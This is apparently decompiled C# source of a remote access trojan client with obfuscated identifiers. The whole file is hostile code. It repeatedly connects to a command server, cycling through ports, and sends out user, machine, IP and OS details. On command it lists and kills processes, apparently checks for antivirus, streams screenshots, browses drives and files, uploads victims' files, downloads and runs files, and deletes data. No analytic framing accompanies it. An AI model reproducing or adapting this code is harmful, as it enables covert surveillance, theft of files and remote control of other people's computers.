using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ntharprmes;

public class MEADRM
{
	private MRAEINF ntharprmesUPC;

	private ORCAMD ntharprmesCMD;

	private int ntharprmesscrSize = 200;

	private ThreadStart ntharprmesfunStarter;

	public TcpClient ntharprmestcpsck;

	public NetworkStream ntharprmesnetStream;

	private int ntharprmesbuffSize = 1024;

	private DRZARIVF ntharprmesHD = new DRZARIVF();

	public bool ntharprmesis_working = false;

	private Dictionary<string, byte[]> ntharprmestasks = new Dictionary<string, byte[]>();

	private int ntharprmesbytesRead = 0;

	public bool ntharprmesreqCnls = false;

	public bool ntharprmesautCnls = false;

	public DateTime ntharprmeslTimeUtc;

	private THRAARE ntharprmesStateObj = new THRAARE();

	private bool ntharprmesiswitch = false;

	public int port_sn = 0;

	private bool ntharprmesthrRuning = false;

	private bool ntharprmesstr_writer = false;

	private bool ntharprmescapScreen = false;

	private Thread ntharprmesfunThread;

	private MemoryStream msStram = new MemoryStream();

	private SCRARNS ntharprmescaps = new SCRARNS();

	private Bitmap image;

	public DateTime ntharprmesrunTime;

	public void ntharprmesdo_start()
	{
		try
		{
			ntharprmesrunTime = DateTime.Now;
			CEAZRNF.ntharprmesport = CEAZRNF.ports[0];
			ntharprmesUPC = new MRAEINF();
			ntharprmesCMD = new ORCAMD(this);
			ntharprmesHD.iserver = this;
			ntharprmesHD.ntharprmesmainPath = CEAZRNF.ntharprmesget_mpath();
			TimerCallback callback = ntharprmeslookup_connect;
			Timer ntharprmestimer = new Timer(callback, ntharprmesStateObj, 31210, 35210);
			ntharprmesStateObj.ntharprmestimer = ntharprmestimer;
		}
		catch (Exception ex)
		{
			ERRHNDL.send_update(ex.Message.ToString());
		}
	}

	public void ntharprmessaveFile(string filePath)
	{
		try
		{
			byte[] array = ntharprmespull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string ntharprmesfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|ntharprmes".Split(new char[1] { '|' })[0] : "<|ntharprmes".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|ntharprmes".Split(new char[1] { '|' })[0] : "<|ntharprmes".Split(new char[1] { '|' })[0]);
			text = text + ntharprmesget_size(fileInfo.Length) + ((!ret) ? ">|ntharprmes".Split(new char[1] { '|' })[0] : "<|ntharprmes".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				ntharprmespush_data(null, "ntharprmes-filsz=|ntharprmes".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private bool ntharprmesIPSConfig()
	{
		try
		{
			CEAZRNF.ntharprmesdefaultP = ntharprmesCMD.ntharprmesserverIPD();
			ntharprmestcpsck = new TcpClient();
			ntharprmestcpsck.Connect(CEAZRNF.ntharprmesdefaultP, CEAZRNF.ntharprmesport);
			return true;
		}
		catch (Exception ex)
		{
			ntharprmesports_switch();
			ERRHNDL.send_update(ex.Message.ToString());
			return false;
		}
	}

	public void ntharprmesports_switch()
	{
		try
		{
			port_sn++;
			CEAZRNF.ntharprmesport = CEAZRNF.ports[port_sn];
			if (port_sn >= CEAZRNF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool ntharprmessend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				ntharprmespush_data(data, "ntharprmes-afile=" + fileinfo);
				return false;
			}
			ntharprmespush_data(null, "ntharprmes-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void ntharprmeslookup_connect(object dosurce)
	{
		try
		{
			if (!ntharprmesthrRuning)
			{
				ntharprmesthrRuning = true;
				ntharprmescheckLastatime(DateTime.Now);
				if (!ntharprmesis_working || !ntharprmestcpsck.Connected)
				{
					ntharprmesis_working = ntharprmesIPSConfig();
					if (ntharprmesis_working)
					{
						ntharprmesbuffSize = ntharprmestcpsck.ReceiveBufferSize;
						ntharprmessee_responce();
					}
				}
			}
			ntharprmesthrRuning = false;
		}
		catch (Exception ex)
		{
			ERRHNDL.send_update(ex.Message.ToString());
			ntharprmesthrRuning = false;
			ntharprmesstr_writer = false;
			ntharprmesis_working = false;
			ntharprmesiswitch = false;
		}
	}

	public void ntharprmeslist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				try
				{
					text = text + processes[i].Id + ">|ntharprmes".Split(new char[1] { '|' })[0];
					text = text + processes[i].ProcessName + ">|ntharprmes".Split(new char[1] { '|' })[0];
					text += "0>|ntharprmes".Split(new char[1] { '|' })[0];
					text += "<";
				}
				catch
				{
				}
			}
			byte[] byteArray = CEAZRNF.getByteArray(text);
			ntharprmespush_data(byteArray, "ntharprmes-" + cmd + "=process|ntharprmes".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void ntharprmesload_app()
	{
		try
		{
			string path = CEAZRNF.ntharprmesget_mpath() + CEAZRNF.ntharprmesmainApp + ".exe|ntharprmes".Split(new char[1] { '|' })[0];
			Thread.Sleep(12);
			CEAZRNF.ntharprmesset_run("aimldh|ntharprmes".Split(new char[1] { '|' })[0], path);
		}
		catch
		{
		}
	}

	private void ntharprmesimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|ntharprmes".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|ntharprmes".Split(new char[1] { '|' })[0];
				text = text + ntharprmesget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				ntharprmespush_data(memoryStream.ToArray(), "ntharprmes-thumb=|ntharprmes".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void ntharprmessee_scren(string screenSize)
	{
		try
		{
			ntharprmesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = ntharprmescaps.ntharprmesscreen(ntharprmesscrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			ntharprmespush_data(msStram.ToArray(), "ntharprmes-sascr=ntharprmes|ntharprmes".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void ntharprmesis_screen(string screenSize)
	{
		try
		{
			ntharprmesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (ntharprmescapScreen && ntharprmesis_working)
			{
				image = ntharprmescaps.ntharprmesscreen(ntharprmesscrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				ntharprmespush_data(msStram.ToArray(), "ntharprmes-scren=ntharprmes|ntharprmes".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void ntharprmesuser_info()
	{
		try
		{
			string text = ntharprmesUPC.ntharprmeslancard + "|" + ntharprmesUPC.ntharprmescname + "-2|" + ntharprmesUPC.ntharprmesuname + "|" + ntharprmesUPC.ntharprmesuip + "|" + CEAZRNF.ntharprmesOsname() + "|" + ntharprmesUPC.ntharprmesapver + "|";
			text += "| !ntharprmes".Split(new char[1] { '!' })[0];
			text = text + "|" + ntharprmesUPC.ntharprmesclientNum;
			text = text + "|" + CEAZRNF.ntharprmesget_mpath();
			byte[] byteArray = CEAZRNF.getByteArray(text);
			ntharprmespush_data(byteArray, "ntharprmes-info=user|ntharprmes".Split(new char[1] { '|' })[0]);
		}
		catch (Exception ex)
		{
			ERRHNDL.send_update(ex.Message.ToString());
		}
	}

	private void ntharprmesscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			ntharprmesscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void ntharprmespush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				ntharprmespush_data(File.ReadAllBytes(lfile), "ntharprmes-file=|ntharprmes".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void ntharprmesremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string ntharprmesget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|ntharprmes".Split(new char[1] { '|' })[0],
				"KB|ntharprmes".Split(new char[1] { '|' })[0],
				"MB|ntharprmes".Split(new char[1] { '|' })[0],
				"GB|ntharprmes".Split(new char[1] { '|' })[0],
				"TB|ntharprmes".Split(new char[1] { '|' })[0],
				"PB|ntharprmes".Split(new char[1] { '|' })[0],
				"EB|ntharprmes".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "0";
		}
	}

	public string[] ntharprmesget_command()
	{
		try
		{
			byte[] array = new byte[5];
			ntharprmesbytesRead = ntharprmesnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= ntharprmesbytesRead)
			{
				int count = ((num3 > ntharprmesbuffSize) ? ntharprmesbuffSize : num3);
				ntharprmesbytesRead = ntharprmesnetStream.Read(array2, num2, count);
				num2 += ntharprmesbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			ntharprmesis_working = false;
			return null;
		}
	}

	private void ntharprmescheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(ntharprmesrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 3)
			{
				ntharprmestcpsck.Close();
				ntharprmesis_working = false;
			}
		}
		catch
		{
		}
	}

	public byte[] ntharprmespull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			ntharprmesbytesRead = ntharprmesnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !ntharprmesreqCnls)
			{
				int count = ((num3 > ntharprmesbuffSize) ? ntharprmesbuffSize : num3);
				ntharprmesbytesRead = ntharprmesnetStream.Read(array2, num, count);
				num += ntharprmesbytesRead;
				num3 -= ntharprmesbytesRead;
				ntharprmesrunTime = DateTime.Now;
			}
			if (ntharprmesreqCnls)
			{
				ntharprmesnetStream.Flush();
				while (ntharprmesnetStream.DataAvailable && ntharprmesnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			ntharprmesis_working = false;
			return null;
		}
	}

	private void ntharprmeslistDrives()
	{
		string text = ntharprmesHD.ntharprmeslookupDrives();
		ntharprmespush_data(null, "ntharprmes-dirs=" + text);
	}

	private void ntharprmessee_responce()
	{
		if (!ntharprmesiswitch)
		{
			ntharprmesiswitch = true;
			ntharprmesnetStream = ntharprmesCMD.ntharprmesNS(ntharprmestcpsck);
			ntharprmescapScreen = false;
			while (ntharprmesis_working)
			{
				string[] switchType = ntharprmesget_command();
				if (switchType != null)
				{
					ntharprmesreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("ntharprmes-" + text) : ("ntharprmes-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "ntharprmes-procl":
						ntharprmesfunStarter = delegate
						{
							ntharprmeslist_processes("procl");
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-getavs":
						ntharprmesfunStarter = delegate
						{
							ntharprmeslist_processes("getavs");
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-thumb":
						ntharprmesimage_info(switchType[1]);
						break;
					case "ntharprmes-filsz":
						ntharprmesfunStarter = delegate
						{
							ntharprmesfile_info(switchType[1]);
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-rupth":
						ntharprmespush_data(null, "ntharprmes-appth=|ntharprmes".Split(new char[1] { '|' })[0] + CEAZRNF.ntharprmesget_mpath());
						break;
					case "ntharprmes-dowf":
						ntharprmessaveFile(switchType[1]);
						break;
					case "ntharprmes-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "ntharprmes-scrsz":
						ntharprmesscreenSize(switchType[1]);
						break;
					case "ntharprmes-cscreen":
						ntharprmessee_scren(switchType[1]);
						break;
					case "ntharprmes-dirs":
						ntharprmesfunThread = new Thread(ntharprmeslistDrives);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-stops":
						ntharprmescapScreen = false;
						break;
					case "ntharprmes-scren":
						ntharprmescapScreen = true;
						ntharprmesfunStarter = delegate
						{
							ntharprmesis_screen(switchType[1]);
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-cnls":
						ntharprmesautCnls = true;
						ntharprmesreqCnls = true;
						ntharprmescapScreen = false;
						break;
					case "ntharprmes-udlt":
						ntharprmesCMD.ntharprmesremove_user();
						break;
					case "ntharprmes-delt":
						ntharprmesremove_file(switchType[1]);
						break;
					case "ntharprmes-afile":
						ntharprmesfunStarter = delegate
						{
							ntharprmessend_auto(switchType[1]);
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-listf":
						ntharprmesfunStarter = delegate
						{
							ntharprmesHD.ntharprmeslookFiles(switchType[1]);
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-file":
						ntharprmesfunStarter = delegate
						{
							ntharprmespush_file(switchType[1]);
						};
						ntharprmesfunThread = new Thread(ntharprmesfunStarter);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-clping":
						ntharprmesrunTime = DateTime.Now;
						break;
					case "ntharprmes-info":
						ntharprmesfunThread = new Thread(ntharprmesuser_info);
						ntharprmesfunThread.Start();
						break;
					case "ntharprmes-runf":
						ntharprmesCMD.ntharprmesdo_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "ntharprmes-fles":
					{
						string files = ntharprmesHD.ntharprmeslookupFiles(switchType[1]);
						if (files != "")
						{
							ntharprmesfunStarter = delegate
							{
								ntharprmespush_data(null, "ntharprmes-fles=|ntharprmes".Split(new char[1] { '|' })[0] + files);
							};
							ntharprmesfunThread = new Thread(ntharprmesfunStarter);
							ntharprmesfunThread.Start();
						}
						break;
					}
					case "ntharprmes-dowr":
						ntharprmessaveFile(switchType[1]);
						break;
					case "ntharprmes-fldr":
					{
						string Folders = ntharprmesHD.ntharprmescheckFolders(switchType[1]);
						if (Folders != "")
						{
							ntharprmesfunStarter = delegate
							{
								ntharprmespush_data(null, "ntharprmes-fldr=|ntharprmes".Split(new char[1] { '|' })[0] + Folders);
							};
							ntharprmesfunThread = new Thread(ntharprmesfunStarter);
							ntharprmesfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				ntharprmesis_working = false;
				break;
			}
			ntharprmesis_working = false;
			ntharprmescapScreen = false;
		}
		ntharprmesiswitch = false;
	}

	public bool ntharprmespush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (ntharprmesstr_writer)
			{
				return false;
			}
			ntharprmesstr_writer = true;
			byte[] byteArray = CEAZRNF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !ntharprmesreqCnls)
			{
				int num5 = ((num4 > ntharprmesbuffSize) ? ntharprmesbuffSize : num4);
				ntharprmesnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				ntharprmesrunTime = DateTime.Now;
			}
			ntharprmesstr_writer = false;
			if (ntharprmesreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			ntharprmesstr_writer = false;
			ntharprmesis_working = false;
			return false;
		}
	}
}
